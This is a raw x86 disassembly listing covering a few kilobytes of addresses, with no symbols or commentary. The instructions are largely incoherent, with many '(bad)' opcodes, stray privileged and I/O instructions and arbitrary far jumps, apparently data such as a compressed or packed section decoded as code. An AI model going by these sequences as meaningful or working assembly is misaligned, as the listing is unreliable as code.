  426099:	shr    DWORD PTR [esi-0x41211f14],cl
  42609f:	or     al,0xd7
  4260a1:	push   eax
  4260a2:	and    al,0xd2
  4260a4:	mov    ds:0x326c0bb4,eax
  4260a9:	jle    0x42605b
  4260ab:	clc    
  4260ac:	stos   DWORD PTR es:[edi],eax
  4260ad:	adc    ebx,DWORD PTR [edx+0x4661823b]
  4260b3:	cmc    
  4260b4:	lds    ebx,FWORD PTR [edi+0x7d]
  4260b7:	push   esp
  4260b8:	mov    si,0xd01a
  4260bc:	sahf   
  4260bd:	adc    al,0xf4
  4260bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260c0:	aad    0x95
  4260c2:	jno    0x426116
  4260c4:	(bad)  [eax]
  4260c6:	xchg   ebx,eax
  4260c7:	add    DWORD PTR [esi+0x58],edx
  4260ca:	loop   0x4260cc
  4260cc:	stos   BYTE PTR es:[edi],al
  4260cd:	or     bh,BYTE PTR [edi]
  4260cf:	jg     0x426080
  4260d1:	cld    
  4260d2:	loop   0x42605a
  4260d4:	or     al,0x8
  4260d6:	scas   eax,DWORD PTR es:[edi]
  4260d7:	iret   
  4260d8:	in     al,dx
  4260d9:	inc    edx
  4260da:	pusha  
  4260db:	aam    0x14
  4260dd:	dec    edi
  4260de:	(bad)
  4260e2:	pop    esi
  4260e3:	jae    0x4260d9
  4260e5:	mov    al,0x4e
  4260e7:	adc    ch,BYTE PTR [edi+0x9]
  4260ea:	inc    ebp
  4260eb:	jne    0x426136
  4260ed:	je     0x426129
  4260ef:	mov    al,0xc7
  4260f1:	push   ebx
  4260f2:	les    eax,FWORD PTR [esi]
  4260f4:	fbstp  TBYTE PTR [esi+eax*2+0xa]
  4260f8:	(bad)  
  4260f9:	fld    DWORD PTR [edi+esi*8]
  4260fc:	mov    ebx,0xa02dccde
  426101:	test   eax,0xd0825efa
  426106:	adc    eax,0x382560b2
  42610b:	add    eax,0x617a8493
  426110:	and    bh,BYTE PTR [edx-0x28a0dba0]
  426116:	jmp    0xbefc3c05
  42611b:	les    ecx,FWORD PTR [ebp+0x45323387]
  426121:	fnstenv [eax-0x2fc55d5a]
  426127:	jno    0x4260f3
  426129:	push   ss
  42612a:	arpl   WORD PTR [eax+edx*8-0x9],si
  42612e:	data16 (bad) 
  426130:	adc    DWORD PTR [ebx-0x17c50b56],ebx
  426136:	sbb    DWORD PTR [esi+0xc630982],esi
  42613c:	jb     0x42614c
  42613e:	loopne 0x426157
  426140:	push   ds
  426141:	hlt    
  426142:	xlat   BYTE PTR ds:[ebx]
  426143:	cld    
  426144:	and    edx,ecx
  426146:	and    al,0xe2
  426148:	retf   0x24ac
  42614b:	enter  0x97cb,0x34
  42614f:	push   edi
  426150:	mov    DWORD PTR [edx-0x1ae219c7],0xb882c42a
  42615a:	aad    0x25
  42615c:	jmp    0x5a69:0xe9f2bef
  426163:	aad    0x43
  426165:	jne    0x42615d
  426167:	push   esi
  426168:	push   esi
  426169:	jle    0x426164
  42616b:	icebp  
  42616c:	retf   
  42616d:	sbb    dl,BYTE PTR [esi-0x2]
  426170:	test   BYTE PTR [eax+0x72],dh
  426173:	push   ss
  426174:	js     0x426194
  426176:	mov    ah,0x7d
  426178:	or     esp,esp
  42617a:	pop    esp
  42617b:	loopne 0x4261fb
  42617d:	dec    esp
  42617e:	xor    DWORD PTR [esi+0x1b00f086],esi
  426184:	add    ebp,DWORD PTR [ecx-0x55145250]
  42618a:	jb     0x4261c7
  42618c:	in     eax,dx
  42618d:	jb     0x4261cd
  42618f:	sbb    DWORD PTR [esi],esp
	...
  4261f1:	add    BYTE PTR [eax],al
  4261f3:	add    BYTE PTR [ebx-0x409ef0df],bl
  4261f9:	outs   dx,DWORD PTR ds:[esi]
  4261fa:	(bad)  
  4261fb:	sti    
  4261fc:	mov    bh,0x83
  4261fe:	mov    cl,0x27
  426200:	push   es
  426201:	jg     0x42623a
  426203:	enter  0x97a6,0x1
  426207:	add    BYTE PTR ds:0x6e000001,al
  42620d:	inc    ebx
  42620e:	pushf  
  42620f:	or     BYTE PTR [edi],ch
  426211:	mov    ds:0x5cf8476f,al
  426216:	(bad)  
  426217:	or     ah,BYTE PTR [ecx-0x7a]
  42621a:	sbb    al,0x29
  42621c:	adc    eax,0xcec8ee80
  426221:	ror    DWORD PTR [ebx+0x1d1d069d],1
  426227:	(bad)  
  426228:	ds or  eax,0xcad14a56
  42622e:	and    ebx,DWORD PTR [ecx+0x3d]
  426231:	add    BYTE PTR [eax+0x7d],cl
  426234:	(bad)  
  426235:	mov    esi,0xdbd6cfca
  42623a:	add    DWORD PTR [eax],eax
  42623c:	scas   al,BYTE PTR es:[edi]
  42623d:	(bad)
  426240:	and    al,0x5c
  426242:	and    DWORD PTR [eax-0x59],ebx
  426245:	push   edx
  426246:	dec    ebp
  426247:	mov    ebp,0x160e1966
  42624c:	dec    eax
  42624d:	sar    al,0x7c
  426250:	icebp  
  426251:	es sti 
  426253:	lahf   
  426254:	jno    0x426237
  426256:	mov    edx,0x7782a57b
  42625b:	dec    ebp
  42625c:	pop    es
  42625d:	adc    DWORD PTR [ebx],ebx
  42625f:	test   eax,ecx
  426261:	mov    al,ds:0x360947aa
  426266:	and    ecx,DWORD PTR [eax]
  426268:	pop    eax
  426269:	or     DWORD PTR [esi],ecx
  42626b:	mov    es,esi
  42626d:	mov    dl,0x94
  42626f:	xchg   DWORD PTR [edi+0x41],edi
  426272:	lods   eax,DWORD PTR ds:[esi]
  426273:	aas    
  426274:	mov    BYTE PTR [esi+ebp*2+0x4022a495],bl
  42627b:	jge    0x426231
  42627d:	push   cs
  42627e:	push   ecx
  42627f:	icebp  
  426280:	in     al,0x3f
  426282:	pop    ebp
  426283:	ror    BYTE PTR [esi-0x2b7ad42e],1
  426289:	jle    0x4262cc
  42628b:	jle    0x42625f
  42628d:	inc    edx
  42628e:	mov    bh,0x65
  426290:	push   ebp
  426291:	add    DWORD PTR [edi+0x10],edi
  426294:	cmp    ecx,ebx
  426296:	fsub   st(6),st
  426298:	sbb    DWORD PTR [esp+eax*4-0x3a9c52b2],esp
  42629f:	and    BYTE PTR [edx-0x46b698eb],ch
  4262a5:	lahf   
  4262a6:	push   ecx
  4262a7:	or     esi,DWORD PTR [edi-0x33]
  4262aa:	mov    dl,0xec
  4262ac:	dec    ebp
  4262ad:	ror    BYTE PTR [edi],cl
  4262af:	aad    0xf8
  4262b1:	push   0xeb3e5a0f
  4262b6:	bound  edi,QWORD PTR [esi+0x699aa621]
  4262bc:	dec    edx
  4262bd:	fmul   QWORD PTR [esi+eax*8-0x75]
  4262c1:	mov    dh,0xec
  4262c3:	inc    edx
  4262c4:	pop    edx
  4262c5:	mov    ebp,0xcb36ff61
  4262ca:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4262cc:	(bad)  
  4262cd:	in     al,dx
  4262ce:	in     eax,0xb0
  4262d0:	daa    
  4262d1:	lock adc al,0x77
  4262d4:	sbb    BYTE PTR [ebx-0x73],ah
  4262d7:	or     BYTE PTR [eax],dl
  4262d9:	scas   al,BYTE PTR es:[edi]
  4262da:	fadd   QWORD PTR [edi]
  4262dc:	repnz out dx,al
  4262de:	push   cs
  4262df:	mov    eax,ds:0x2d8ceb9b
  4262e4:	ss mov eax,0x864b463
  4262ea:	nop
  4262eb:	imul   DWORD PTR [ebp-0x53]
  4262ee:	test   al,dh
  4262f0:	mov    al,ds:0x8fc1663a
  4262f5:	loop   0x426361
  4262f7:	mov    ah,0xe3
  4262f9:	jmp    0xb8f1:0xd46a5996
  426300:	adc    eax,0x7e1133b0
  426305:	into   
  426306:	fist   WORD PTR [ecx]
  426308:	loope  0x426296
  42630a:	xchg   ebx,eax
  42630b:	test   eax,0x84439017
  426310:	or     DWORD PTR [eax],eax
	...
  426372:	add    BYTE PTR [eax],al
  426374:	push   esp
  426375:	and    eax,0xeefd4e8d
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0x6d61dca5
  426384:	stos   DWORD PTR es:[edi],eax
  426385:	cwde   
  426386:	add    DWORD PTR [eax],eax
  426388:	add    eax,0xeb000001
  42638d:	mov    dh,0xd5
  42638f:	mov    dl,0x9b
  426391:	pop    ds
  426392:	lock lods eax,DWORD PTR ds:[esi]
  426394:	repnz fisubr DWORD PTR [ebx+ebx*4-0x12]
  426399:	ja     0x4263f4
  42639b:	in     al,0x89
  42639d:	sahf   
  42639e:	fldcw  WORD PTR [ecx]
  4263a0:	or     al,0x9b
  4263a2:	stos   BYTE PTR es:[edi],al
  4263a3:	int    0x92
  4263a5:	sub    DWORD PTR [ecx-0x66],0x14
  4263a9:	mov    esp,0xcf4fe81
  4263ae:	call   0x7e96:0x55e1ee1c
  4263b5:	xchg   esi,eax
  4263b6:	add    al,0x82
  4263b8:	mov    eax,0x4084f595
  4263bd:	bound  edi,QWORD PTR [esi+0x1a90f610]
  4263c3:	jno    0x42635b
  4263c5:	xchg   edi,eax
  4263c6:	loope  0x426360
  4263c8:	or     BYTE PTR [edx+0x2d54593a],cl
  4263ce:	loop   0x4263fc
  4263d0:	fst    st(1)
  4263d2:	xor    eax,0xd504669d
  4263d7:	sbb    eax,0xaada9170
  4263dc:	sub    al,0x99
  4263de:	loope  0x426403
  4263e0:	push   ecx
  4263e1:	and    al,0x15
  4263e3:	cmp    bl,0x6e
  4263e6:	mov    ecx,0x732f1b07
  4263eb:	dec    eax
  4263ec:	pop    edx
  4263ed:	dec    ebx
  4263ee:	enter  0x2ce7,0x9b
  4263f2:	iret   
  4263f3:	xor    ebx,DWORD PTR [esi]
  4263f5:	(bad)  
  4263f6:	adc    eax,0x4d2970a5
  4263fb:	fdivr  st,st(7)
  4263fd:	cmp    ecx,DWORD PTR [edi]
  4263ff:	dec    ecx
  426400:	stos   BYTE PTR es:[edi],al
  426401:	mov    dh,0xa4
  426403:	fld    TBYTE PTR [esi]
  426405:	sub    DWORD PTR [edi+0x3f89b413],ebx
  42640b:	fsub   st(7),st
  42640d:	fs xchg esp,eax
  42640f:	cmp    dh,BYTE PTR [ecx+0x6b740264]
  426415:	xchg   BYTE PTR [ecx],cl
  426417:	call   0xbfd0:0xbfbb58be
  42641e:	inc    ecx
  42641f:	outs   dx,DWORD PTR ds:[esi]
  426420:	(bad)  
  426421:	cmp    ecx,DWORD PTR [ebp+eiz*2+0x91b0fa7]
  426428:	mov    cs,WORD PTR [esi]
  42642a:	inc    esi
  42642b:	xor    ch,BYTE PTR [eax]
  42642d:	mov    ch,0x3c
  42642f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426430:	jmp    0x426499
  426432:	das    
  426433:	inc    edx
  426434:	xchg   DWORD PTR [esi+0x7c],edx
  426437:	test   eax,0xf209ebdf
  42643c:	dec    ebx
  42643d:	dec    eax
  42643e:	std    
  42643f:	mov    ah,BYTE PTR [eax+0x54]
  426442:	in     eax,dx
  426443:	fimul  DWORD PTR [ebx-0xc435524]
  426449:	and    eax,0x257f308
  42644e:	lea    esi,[eax-0x3d6ed843]
  426454:	cmp    ebx,ebp
  426456:	(bad)  
  426457:	sbb    DWORD PTR [ebp+ebp*8-0x1b],edx
  42645b:	pop    ss
  42645c:	fist   DWORD PTR [ebp-0x706ac9ad]
  426462:	sub    al,0xde
  426464:	xchg   esi,eax
  426465:	(bad)  
  426466:	stos   DWORD PTR es:[edi],eax
  426467:	out    dx,eax
  426468:	ret    0xa452
  42646b:	xchg   ecx,eax
  42646c:	gs retf 0xf957
  426470:	push   edi
  426471:	add    edi,eax
  426473:	xor    esi,eax
  426475:	dec    ebx
  426476:	dec    ebx
  426477:	in     eax,0x89
  426479:	into   
  42647a:	and    eax,0xc0b5ce7e
  42647f:	push   ds
  426480:	sbb    ebx,edi
  426482:	pusha  
  426483:	pusha  
  426484:	jnp    0x4264ed
  426486:	jae    0x42643d
  426488:	fisub  DWORD PTR [eax]
  42648a:	sbb    al,0xa4
  42648c:	push   esp
  42648d:	xchg   BYTE PTR [eax+eiz*4+0x6d],al
	...
  4264f1:	add    BYTE PTR [eax],al
  4264f3:	add    BYTE PTR [ecx+0x6f],ch
  4264f6:	mov    BYTE PTR [eax],cl
  4264f8:	mov    gs,edi
  4264fa:	jmp    0x8abb746e
  4264ff:	test   DWORD PTR [edi],ecx
  426501:	mov    dh,0x22
  426503:	lock mov al,0x99
  426506:	add    DWORD PTR [eax],eax
  426508:	add    eax,0x8c000001
  42650d:	xchg   BYTE PTR [esi],ch
  42650f:	outs   dx,DWORD PTR ds:[esi]
  426510:	inc    esi
  426511:	or     DWORD PTR [edi+0x7d0e2c2b],edx
  426517:	sbb    eax,0x593a89e7
  42651c:	clc    
  42651d:	dec    esi
  42651e:	cli    
  42651f:	xor    DWORD PTR [ebp+0x2e],0x1b
  426523:	pop    ebx
  426524:	jmp    0x42656f
  426526:	sbb    BYTE PTR [ecx+0x7c],0xc1
  42652a:	mov    bl,0x8b
  42652c:	lea    esi,[ebx-0x494aeb6d]
  426532:	inc    ebp
  426533:	loop   0x4264ca
  426535:	out    0xce,al
  426537:	cmp    esi,ebp
  426539:	adc    eax,DWORD PTR [edi+0x42]
  42653c:	push   esp
  42653d:	aas    
  42653e:	mov    ds:0x6871c25b,al
  426543:	imul   eax,DWORD PTR [edi-0x41],0xfe2193b5
  42654a:	dec    eax
  42654b:	fwait
  42654c:	sub    ebx,DWORD PTR [esi-0x50]
  42654f:	div    BYTE PTR [ebp+0x73d8833f]
  426555:	xor    al,0x96
  426557:	repnz xlat BYTE PTR ds:[ebx]
  426559:	out    0xbb,al
  42655b:	add    bl,BYTE PTR [esi+0x7a4be656]
  426561:	in     al,0x1a
  426563:	(bad)  
  426564:	jnp    0x42654f
  426566:	pop    edi
  426567:	retf   0x70c6
  42656a:	xchg   edi,eax
  42656b:	popa   
  42656c:	xor    BYTE PTR [ebx+0x42],al
  42656f:	shl    BYTE PTR [esi-0x1efe38f2],0xfd
  426576:	aas    
  426577:	pop    edi
  426578:	sbb    ebp,DWORD PTR [edi+0x13]
  42657b:	fld    TBYTE PTR [ecx+0x79]
  42657e:	cmp    eax,0x5e7207f8
  426583:	shl    ecx,1
  426585:	stc    
  426586:	xor    eax,0xba41821d
  42658b:	add    al,BYTE PTR ds:0xac7c3fb3
  426591:	fbld   TBYTE PTR [ebx]
  426593:	std    
  426594:	mov    dh,0x7e
  426596:	xor    bl,cl
  426598:	test   DWORD PTR [edi],ebx
  42659a:	imul   edi,DWORD PTR [edx-0x4a800990],0xfffffff4
  4265a1:	jge    0x426531
  4265a3:	jbe    0x426561
  4265a5:	sub    al,0x9e
  4265a7:	lahf   
  4265a8:	or     eax,0xbcf3b0f8
  4265ad:	and    al,BYTE PTR [ecx+0x66]
  4265b0:	(bad)  
  4265b2:	cmc    
  4265b3:	popa   
  4265b4:	outs   dx,BYTE PTR ds:[esi]
  4265b5:	int3   
  4265b6:	jecxz  0x426624
  4265b8:	jmp    0x42658f
  4265ba:	add    ah,BYTE PTR [ecx-0x75]
  4265bd:	outs   dx,DWORD PTR ds:[esi]
  4265be:	sub    DWORD PTR [edx+0x62],0x9db5592
  4265c5:	loopne 0x4265c2
  4265c7:	pop    es
  4265c8:	(bad)  
  4265c9:	aam    0xe3
  4265cb:	adc    ah,dh
  4265cd:	xchg   esi,eax
  4265ce:	mov    ebx,0x8b8a933e
  4265d3:	repz xor DWORD PTR [eax-0x29b7e7e7],edi
  4265da:	call   0x8b4444c0
  4265df:	shr    DWORD PTR [edx+0x4021eaf0],0x9a
  4265e6:	jmp    0xc26caad4
  4265eb:	(bad)  
  4265ec:	lds    esi,FWORD PTR fs:[edx-0x374c4fb6]
  4265f3:	dec    ebp
  4265f4:	mov    ah,0xab
  4265f6:	xchg   esp,eax
  4265f7:	fwait
  4265f8:	dec    ecx
  4265f9:	and    eax,0xce587d92
  4265fe:	fstp   QWORD PTR [edx+ebx*8+0x5a]
  426602:	repz push ebp
  426604:	xor    edx,eax
  426606:	push   0x77
  426608:	jl     0x4265da
  42660a:	xor    BYTE PTR [eax],dl
  42660c:	imul   esi,DWORD PTR ds:0xe0346f,0x0
	...
  426672:	add    BYTE PTR [eax],al
  426674:	adc    cl,bl
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi+0x3bb36da4]
  426682:	loopne 0x4266b0
  426684:	mov    ch,0x9a
  426686:	add    DWORD PTR [eax],eax
  426688:	add    eax,0xcb000001
  42668d:	adc    DWORD PTR [ecx+0x5dfbd4eb],esp
  426693:	popa   
  426694:	popf   
  426695:	das    
  426696:	vmptrst QWORD PTR [ebx+0x18]
  42669a:	mov    ds:0x85896d94,eax
  42669f:	adc    eax,DWORD PTR [edx+esi*4+0x50]
  4266a3:	ja     0x426665
  4266a5:	out    dx,al
  4266a6:	cmp    eax,0xe11297c6
  4266ab:	adc    dh,BYTE PTR [esi+eiz*1+0x17b0fcd4]
  4266b2:	cmp    cl,bl
  4266b4:	or     ch,BYTE PTR ds:0x63357141
  4266ba:	ja     0x426651
  4266bc:	mov    bh,0xac
  4266be:	pop    esp
  4266bf:	imul   esp,DWORD PTR cs:[ebp-0x38],0x6e83cb5c
  4266c7:	rol    esi,1
  4266c9:	cli    
  4266ca:	in     al,dx
  4266cb:	pop    esi
  4266cc:	(bad)  
  4266cd:	mov    ah,0x8a
  4266cf:	addr16 call 0xf11f:0x81d4e1a2
  4266d7:	cmc    
  4266d8:	pop    eax
  4266d9:	jnp    0x42667a
  4266db:	push   es
  4266dc:	mov    ebx,0xc4d54ab8
  4266e1:	sahf   
  4266e2:	mov    BYTE PTR [ebp-0x1d],0x54
  4266e6:	dec    edi
  4266e7:	jns    0x42668c
  4266e9:	mov    ch,0xf5
  4266eb:	call   0x34108878
  4266f0:	xchg   edx,eax
  4266f1:	mov    cl,bh
  4266f3:	leave  
  4266f4:	data16 jae 0x4266ab
  4266f7:	cmp    DWORD PTR [ecx-0x5f],ebp
  4266fa:	leave  
  4266fb:	mov    ebx,0x61cb7b6e
  426700:	addr16 pop ebx
  426702:	lds    esp,FWORD PTR [edx+0x65b915b]
  426708:	mov    ebx,0xb9c5a3d6
  42670d:	in     eax,0x73
  42670f:	dec    edx
  426710:	repnz outs dx,DWORD PTR ds:[esi]
  426712:	aad    0x52
  426714:	ja     0x42678a
  426716:	addr16 std 
  426718:	jne    0x426786
  42671a:	sub    al,0xfd
  42671c:	sub    BYTE PTR [edx],0xfc
  42671f:	xlat   BYTE PTR ds:[ebx]
  426720:	test   DWORD PTR [ebx],ebx
  426722:	lea    ebx,[ebp-0x5097dc85]
  426728:	mov    ah,0x3c
  42672a:	shl    DWORD PTR [edi-0x14],0xfd
  42672e:	mov    dh,0x91
  426730:	aad    0xe1
  426732:	adc    al,0xec
  426734:	fcom   DWORD PTR [ecx-0x1559af88]
  42673a:	and    BYTE PTR [eax],bh
  42673c:	adc    dl,0x2c
  42673f:	cmp    DWORD PTR [ecx-0x27842a9e],edi
  426745:	xchg   edx,eax
  426746:	test   ch,al
  426748:	mov    al,BYTE PTR [edx-0x5fe6a79f]
  42674e:	cmp    BYTE PTR [edi],dh
  426750:	adc    BYTE PTR [edi],cl
  426752:	scas   al,BYTE PTR es:[edi]
  426753:	dec    cx
  426755:	iret   
  426756:	jle    0x426769
  426758:	stos   BYTE PTR es:[edi],al
  426759:	jnp    0x42677b
  42675b:	dec    ebp
  42675c:	ds idiv ebp
  42675f:	pusha  
  426760:	imul   ebp,DWORD PTR [edi],0xffffffc0
  426763:	add    bl,bh
  426765:	out    0x66,eax
  426767:	mov    al,0x8a
  426769:	mov    al,ds:0x4e15ffb0
  42676e:	adc    eax,0xe52b560a
  426773:	(bad)  
  426774:	cmp    BYTE PTR [edx+0x64],cl
  426777:	mov    ebx,ebp
  426779:	sub    esi,DWORD PTR [edx]
  42677b:	inc    ebp
  42677c:	in     al,0x97
  42677e:	sbb    DWORD PTR [edx-0x39a85db2],esi
  426784:	xor    DWORD PTR [edi],ecx
  426786:	hlt    
  426787:	cmp    al,BYTE PTR [edi-0x55]
  42678a:	mov    eax,ds:0xa196b729
  42678f:	ds pop esi
	...
  4267f1:	add    BYTE PTR [eax],al
  4267f3:	add    BYTE PTR [eax-0xd53173],bh
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	fadd   DWORD PTR [edi-0x72]
  426803:	outs   dx,DWORD PTR ds:[esi]
  426804:	mov    edx,0x500019b
  426809:	add    DWORD PTR [eax],eax
  42680b:	add    BYTE PTR [ecx+ebx*4],al
  42680e:	scas   eax,DWORD PTR es:[edi]
  42680f:	add    BYTE PTR [ecx-0x46],ch
  426812:	retf   
  426813:	mov    gs,WORD PTR [ebx]
  426815:	xor    al,0x47
  426817:	xchg   edx,eax
  426818:	push   0x25e6052c
  42681d:	jl     0x4267d9
  42681f:	nop
  426820:	inc    edi
  426821:	push   esp
  426822:	pop    esp
  426823:	daa    
  426824:	mov    ebx,DWORD PTR [esi+eax*1]
  426827:	scas   eax,DWORD PTR es:[edi]
  426828:	js     0x426834
  42682a:	jp     0x426870
  42682c:	sar    BYTE PTR [edi+0x4b],1
  42682f:	inc    edx
  426830:	mov    esi,0x43eeec1
  426835:	pushf  
  426836:	mov    bh,0x9e
  426838:	xlat   BYTE PTR ds:[ebx]
  426839:	xor    al,0x6c
  42683b:	lods   al,BYTE PTR ds:[esi]
  42683c:	mov    dh,0x28
  42683e:	dec    esp
  42683f:	xor    ebx,edi
  426841:	xor    BYTE PTR [edx+0x67],0x2
  426845:	sub    al,0x1
  426847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426848:	popa   
  426849:	pop    esi
  42684a:	rcr    BYTE PTR [esp+ebp*8-0x1e],0xe6
  42684f:	mov    al,ds:0xb1291c2b
  426854:	dec    ebp
  426855:	jg     0x42681a
  426857:	ror    ch,1
  426859:	mov    al,ds:0xf37b641
  42685e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42685f:	adc    eax,DWORD PTR ds:0xe0d4b0c3
  426865:	arpl   WORD PTR [ebx],sp
  426867:	adc    eax,0x5c26ccd1
  42686c:	xor    BYTE PTR [edx+0x5ec7552e],dh
  426872:	and    BYTE PTR ds:0x92c738f9,ah
  426878:	cdq    
  426879:	push   ecx
  42687a:	dec    ebp
  42687b:	daa    
  42687c:	jo     0x42687e
  42687e:	jmp    0x42685b
  426880:	and    edi,esi
  426882:	ret    0x8709
  426885:	arpl   WORD PTR [edi+0x45c89b00],si
  42688b:	jmp    0x52b95f5a
  426890:	inc    edi
  426891:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426892:	test   DWORD PTR [edx-0x411db73d],edi
  426898:	dec    edx
  426899:	add    BYTE PTR [eax],ah
  42689b:	pop    esp
  42689c:	aad    0x84
  42689e:	sub    al,0x70
  4268a0:	fwait
  4268a1:	xchg   ebx,eax
  4268a2:	je     0x42683a
  4268a4:	inc    ecx
  4268a5:	xchg   edx,eax
  4268a6:	repnz clc 
  4268a8:	(bad)  
  4268a9:	fcmovne st,st(5)
  4268ab:	add    eax,DWORD PTR [ebx]
  4268ad:	es cwde 
  4268af:	daa    
  4268b0:	ss retf 
  4268b2:	jae    0x426912
  4268b4:	imul   eax,esi,0x54bef81b
  4268ba:	cs out dx,eax
  4268bc:	call   0x5801:0xb3990469
  4268c3:	xchg   esi,eax
  4268c4:	js     0x4268fa
  4268c6:	xor    eax,0x35589fcb
  4268cb:	pop    ss
  4268cc:	sub    al,0xaa
  4268ce:	loop   0x4268f0
  4268d0:	and    ah,BYTE PTR [ecx+0x52]
  4268d3:	in     eax,0x87
  4268d5:	fdivr  DWORD PTR [eax]
  4268d7:	repz sbb DWORD PTR [esi+0x25bc4710],ebp
  4268de:	icebp  
  4268df:	mov    edx,0xfe84f983
  4268e4:	ss ja  0x426895
  4268e7:	xchg   DWORD PTR [edx+0x23],edx
  4268ea:	popa   
  4268eb:	stos   BYTE PTR es:[edi],al
  4268ec:	mov    ds:0x840a2452,al
  4268f1:	ret    0xbae8
  4268f4:	fistp  WORD PTR [ebp-0x16]
  4268f7:	lea    edx,[ebp-0xe]
  4268fa:	mov    esp,0x8ed4a205
  4268ff:	and    al,0x3b
  426901:	sbb    ecx,ecx
  426903:	pop    edx
  426904:	ja     0x4268fc
  426906:	push   ss
  426907:	lods   eax,DWORD PTR ds:[esi]
  426908:	scas   eax,DWORD PTR es:[edi]
  426909:	in     al,0x5e
  42690b:	test   al,0xec
  42690d:	(bad)  
  42690e:	clc    
  42690f:	sbb    al,0x6f
	...
  426971:	add    BYTE PTR [eax],al
  426973:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  42697a:	mov    edi,?
  42697c:	sub    ebp,esp
  42697e:	lahf   
  42697f:	mov    ecx,DWORD PTR [esi]
  426981:	dec    esi
  426982:	lahf   
  426983:	je     0x426944
  426985:	pushf  
  426986:	add    DWORD PTR [eax],eax
  426988:	add    eax,0x5d000001
  42698d:	ja     0x426911
  42698f:	je     0x4269ae
  426991:	or     eax,0x98e652bc
  426996:	fisttp DWORD PTR [edx-0x1f]
  426999:	or     ebp,DWORD PTR [ecx+0x63759838]
  42699f:	and    eax,0x1f506026
  4269a4:	xchg   esp,eax
  4269a5:	adc    bh,BYTE PTR [ebp+0x2927ba39]
  4269ab:	pop    ecx
  4269ac:	sub    DWORD PTR [ebp+0x795c1e9d],esi
  4269b2:	cmp    DWORD PTR [ecx-0x5c],esi
  4269b5:	loope  0x426a0a
  4269b7:	inc    edi
  4269b8:	inc    esp
  4269b9:	sbb    edi,ebx
  4269bb:	mov    ebp,DWORD PTR [ecx+0x6c]
  4269be:	mov    cl,0xcb
  4269c0:	push   eax
  4269c1:	jns    0x4269c1
  4269c3:	pushf  
  4269c4:	inc    esp
  4269c5:	ins    DWORD PTR es:[edi],dx
  4269c6:	(bad)  [eax]
  4269c8:	ja     0x426a36
  4269ca:	ss stos BYTE PTR es:[edi],al
  4269cc:	and    eax,0x66f1cdd6
  4269d1:	sub    al,0x34
  4269d3:	and    al,0x9
  4269d5:	sub    edi,eax
  4269d7:	mov    dh,0x99
  4269d9:	sbb    eax,edx
  4269db:	shl    ebx,0x63
  4269de:	fnsave [edx-0x2e]
  4269e1:	aaa    
  4269e2:	and    eax,edi
  4269e4:	adc    dl,BYTE PTR [esi-0x15c93ee2]
  4269ea:	scas   al,BYTE PTR es:[edi]
  4269eb:	adc    esp,eax
  4269ed:	mov    ah,0x74
  4269ef:	xchg   esp,eax
  4269f0:	xor    al,0x95
  4269f2:	and    DWORD PTR [edi],esp
  4269f4:	in     eax,0xef
  4269f6:	mov    eax,ds:0xcc32a419
  4269fb:	mov    esp,0x88c6c61b
  426a00:	sub    BYTE PTR [edx+0x35d7dc16],cl
  426a06:	mov    dx,0xe96e
  426a0a:	stc    
  426a0b:	sbb    DWORD PTR [ebp-0x1d5689a],ebx
  426a11:	pop    edi
  426a12:	mov    al,0x75
  426a14:	sbb    al,0x40
  426a16:	ja     0x426a0d
  426a18:	mov    edi,0x3604506
  426a1d:	dec    ecx
  426a1e:	dec    ecx
  426a1f:	mov    dh,0x50
  426a21:	add    eax,0x7dd9a6f2
  426a26:	outs   dx,DWORD PTR ds:[esi]
  426a27:	jo     0x4269c4
  426a29:	mov    ds:0x13e5fd1,al
  426a2e:	mov    edi,0xbca86ac4
  426a33:	cwde   
  426a34:	ins    DWORD PTR es:[edi],dx
  426a35:	bnd jnp 0x4269d9
  426a38:	fucomp st(6)
  426a3a:	fwait
  426a3b:	stos   BYTE PTR es:[edi],al
  426a3c:	mov    al,0x8c
  426a3e:	push   ebp
  426a3f:	enter  0x4728,0x56
  426a43:	(bad)  
  426a44:	stc    
  426a45:	es jo  0x426a07
  426a48:	add    DWORD PTR [esi+ecx*4-0x761b9d4d],esi
  426a4f:	sahf   
  426a50:	mov    dl,0x11
  426a52:	aaa    
  426a53:	dec    esi
  426a54:	test   BYTE PTR [ebp+0x7adddd8f],al
  426a5a:	inc    ecx
  426a5b:	(bad)  
  426a5c:	or     bh,BYTE PTR ds:0x4661f2ee
  426a62:	cmp    edx,DWORD PTR [ebp+0xa7fb482]
  426a68:	call   0xbcaa349f
  426a6d:	jmp    0x10b4:0xf4257409
  426a74:	mul    BYTE PTR [ebx]
  426a76:	push   esp
  426a77:	mov    BYTE PTR [edx+0x50f7ba2a],al
  426a7d:	cmc    
  426a7e:	rcr    BYTE PTR [ecx-0x1b],cl
  426a81:	xchg   ecx,eax
  426a82:	jg     0x426a1a
  426a84:	xor    BYTE PTR [ecx+0x396364fa],0x3f
  426a8b:	rol    DWORD PTR [ebp-0x78c5d8f8],0x0
	...
  426af2:	add    BYTE PTR [eax],al
  426af4:	cdq    
  426af5:	sub    BYTE PTR ds:0xdb77bd56,cl
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x55
  426b01:	and    eax,0x9dc413bf
  426b06:	add    DWORD PTR [eax],eax
  426b08:	add    eax,0x6e000001
  426b0d:	and    al,0xab
  426b0f:	ja     0x426b72
  426b11:	mov    cl,0xce
  426b13:	test   al,0x45
  426b15:	jne    0x426b93
  426b17:	rol    DWORD PTR [edx],1
  426b19:	das    
  426b1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b1b:	leavew 
  426b1d:	or     ch,bh
  426b1f:	sbb    ah,BYTE PTR [edi]
  426b21:	fs in  al,0xbd
  426b24:	div    ah
  426b26:	jns    0x426ac8
  426b28:	repnz mov ah,cl
  426b2b:	jns    0x426af4
